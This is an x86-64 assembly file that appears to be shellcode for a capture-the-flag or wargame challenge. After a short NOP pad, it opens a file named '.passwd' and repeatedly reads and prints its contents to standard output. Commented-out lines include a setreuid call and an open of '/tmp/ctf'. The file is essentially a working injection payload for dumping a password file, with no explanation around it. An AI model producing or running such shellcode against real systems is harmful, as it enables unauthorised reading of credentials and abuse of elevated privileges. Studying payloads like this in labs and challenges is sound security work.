.text
.global _start
_start:
    jmp     escape_sheeps
    nop
    nop
    nop
    nop
    nop
    nop
    nop
escape_sheeps:
    /*
    movb    $113,               %al
    movw    $1155,              %di
    movw    $1155,              %si
    syscall
    xor     %rax,               %rax
    */
    movb    $2,                 %al
    mov     $0x6477737361702eFF,%rdi
    shr     $8,                 %rdi
    push    %rdi
    mov     %rsp,               %rdi
    syscall
    push    %rax
    /*
    movb    $2,                 %al
    mov     $0x6674632f706D742F,%rdi
    push    %rdi
    mov     %rsp,               %rdi
    syscall
    push    %rax
    */
    sub     $16,                %rsp
read:
    movq    16(%rsp),           %rdi
    push    %rsp               
    pop     %rsi
    movb    $16,                %dl
    xor     %rax,               %rax
    syscall
    push    %rax
    pop     %rdx
    movb    $1,                 %al
    movb     $1,                %dil
    push    %rsp                
    pop     %rsi
    syscall
    cmp     $16,                %rax
    je      read
    ret
